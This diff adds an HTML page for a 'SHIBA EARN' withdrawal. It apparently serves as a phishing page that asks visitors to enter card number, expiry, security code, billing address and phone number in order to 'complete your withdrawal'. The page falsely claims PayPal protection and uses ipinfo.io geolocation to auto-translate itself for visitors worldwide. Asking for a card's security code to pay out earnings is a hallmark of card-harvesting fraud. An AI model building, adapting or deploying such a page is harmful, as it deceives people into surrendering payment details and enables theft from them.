@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Withdrawal</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+</head>
+<body class="bg-gradient-to-r from-gray-900 to-gray-700 font-serif md:flex justify-center items-center min-h-screen">
+    <header class="bg-gray-800 p-4 mb-8 w-full">
+        <div class="flex items-center">
+            <img src="./image/no1122shibainu.webp" class="rounded-full w-11 mr-4" alt="">
+            <span class="font-bold text-2xl text-white">SHIBA EARN</span>
+            <!--<img id="bb" src="./image/download (2).jpg" alt="translator" class="w-6 ml-auto rounded-full cursor-pointer">-->
+        </div>
+        <div class="hidden p" id="google_translate_element"></div>
+    </header>
+
+    <div class="bg-gradient-to-r from-gray-800 to-gray-600 p-8 rounded-lg shadow-lg w-full max-w-lg">
+        <h1 class="font-bold text-lg text-blue-300 mb-6">Withdrawal Details</h1>
+        <div>
+            <h2 class="text-white"> fill up you’re withdrawing details to complete your withdrawal</h2>
+
+            <img src="./image/mc-card.png" class="size-24 " alt="">
+        </div>
+        <form action="/withdraw" method="post">
+            <h2 class="text-xl font-bold text-gray-300">Card Information</h2>
+            <div class="mb-4">
+                <label class="font-bold text-gray-200" for="number">Card digit:</label>
+                <input class="bg-gray-700 border border-gray-600 text-gray-300 rounded w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline" type="number" name="data" required>
+            </div>
+            <div class="mb-4">
+                <label class="font-bold text-gray-200" for="expiration-date">Expiration Date:</label>
+                <input class="bg-gray-700 border border-gray-600 text-gray-300 rounded w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline" type="date" name="expiration_date" required>
+            </div>
+            <div class="mb-4">
+                <label class="font-bold text-gray-200" for="security-code">Security Code:</label>
+                <input class="bg-gray-700 border border-gray-600 text-gray-300 rounded w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline" type="number" name="security_code" required>
+            </div>
+            <div class="mb-4">
+                <label class="font-bold text-gray-200" for="account-name">Account Name:</label>
+                <input class="bg-gray-700 border border-gray-600 text-gray-300 rounded w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline" type="text" name="account_name" required>
+            </div>
+            <h2 class="text-xl font-bold text-gray-300 mt-6">Billing Address</h2>
+            <div class="mb-4">
+                <label class="font-bold text-gray-200" for="street-address">Street Address:</label>
+                <input class="bg-gray-700 border border-gray-600 text-gray-300 rounded w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline" type="text" name="street_address" required>
+            </div>
+            <div class="mb-4">
+                <label class="font-bold text-gray-200" for="country">Country:</label>
+                <input class="bg-gray-700 border border-gray-600 text-gray-300 rounded w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline" type="text" name="country" required>
+            </div>
+            <div class="mb-4">
+                <label class="font-bold text-gray-200" for="city">City:</label>
+                <input class="bg-gray-700 border border-gray-600 text-gray-300 rounded w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline" type="text" name="city" required>
+            </div>
+            <div class="mb-4">
+                <label class="font-bold text-gray-200" for="state">State/Province/Region:</label>
+                <input class="bg-gray-700 border border-gray-600 text-gray-300 rounded w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline" type="text" name="state" required>
+            </div>
+            <div class="mb-4">
+                <label class="font-bold text-gray-200" for="zip-code">ZIP Code:</label>
+                <input class="bg-gray-700 border border-gray-600 text-gray-300 rounded w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline" type="text" name="zip_code" required>
+            </div>
+            <div class="mb-4">
+                <label class="font-bold text-gray-200" for="phone-number">Phone Number:</label>
+                <input class="bg-gray-700 border border-gray-600 text-gray-300 rounded w-full py-2 px-3 leading-tight focus:outline-none focus:shadow-outline" type="number" name="phone_number" required>
+            </div>
+            <div class="flex items-center justify-center mt-4">
+                <button type="submit" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline">
+                    Submit Withdrawal Request
+                </button>
+            </div>
+            <h2 class="text-gray-300 mt-4">your card is securde by paypal security and private policy </h2>
+        </form>
+    </div>
+
+    <p class="text-center text-gray-500 text-xs mt-4">
+        &copy;2024 Grace Tech. All rights reserved.
+    </p>
+
+    <script>
+        $(document).ready(function(){
+            $("#bb").click(function(){
+                $(".p").toggle();
+            });
+        });
+    </script>
+    <script type="text/javascript">
+        // Function to initialize Google Translate
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({
+                pageLanguage: 'en', // Default language
+                includedLanguages: 'en,fr,es,de,zh,ar,hi,pt,ru,ja,ko,it,nl', // Add more languages
+                layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
+                autoDisplay: false // Prevents auto-display of the Google Translate bar
+            }, 'google_translate_element');
+        }
+
+        // Fetch user location using ipinfo.io with your token
+        fetch('https://ipinfo.io?token=83999d9e50a879')
+            .then(response => response.json())
+            .then(data => {
+                const userCountry = data.country; // Get user country code
+                let language = 'en'; // Default language
+
+                // Map country codes to languages
+                if (userCountry === 'FR') language = 'fr';  // France -> French
+                if (userCountry === 'ES') language = 'es';  // Spain -> Spanish
+                if (userCountry === 'DE') language = 'de';  // Germany -> German
+                if (userCountry === 'CN') language = 'zh';  // China -> Chinese
+                if (userCountry === 'AR') language = 'ar';  // Arabic-speaking countries
+                if (userCountry === 'IN') language = 'hi';  // India -> Hindi
+                if (userCountry === 'BR') language = 'pt';  // Brazil -> Portuguese
+                if (userCountry === 'RU') language = 'ru';  // Russia -> Russian
+                if (userCountry === 'JP') language = 'ja';  // Japan -> Japanese
+                if (userCountry === 'KR') language = 'ko';  // Korea -> Korean
+                if (userCountry === 'IT') language = 'it';  // Italy -> Italian
+                if (userCountry === 'NL') language = 'nl';  // Netherlands -> Dutch
+
+                // After detecting the location, load the Google Translate API
+                const script = document.createElement('script');
+                script.type = 'text/javascript';
+                script.src = "//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";
+                document.head.appendChild(script);
+
+                // After the Google Translate widget is initialized, auto-select the language
+                script.onload = function() {
+                    setTimeout(function() {
+                        const googleTranslateFrame = document.querySelector('.goog-te-combo');
+                        if (googleTranslateFrame) {
+                            googleTranslateFrame.value = language; // Set the detected language
+                            googleTranslateFrame.dispatchEvent(new Event('change')); // Trigger the language change
+                        }
+                    }, 500); // Delay to ensure the widget is loaded
+                };
+            })
+            .catch(error => {
+                console.error("Geolocation error:", error);
+            });
+    </script>
+</body>
+</html>
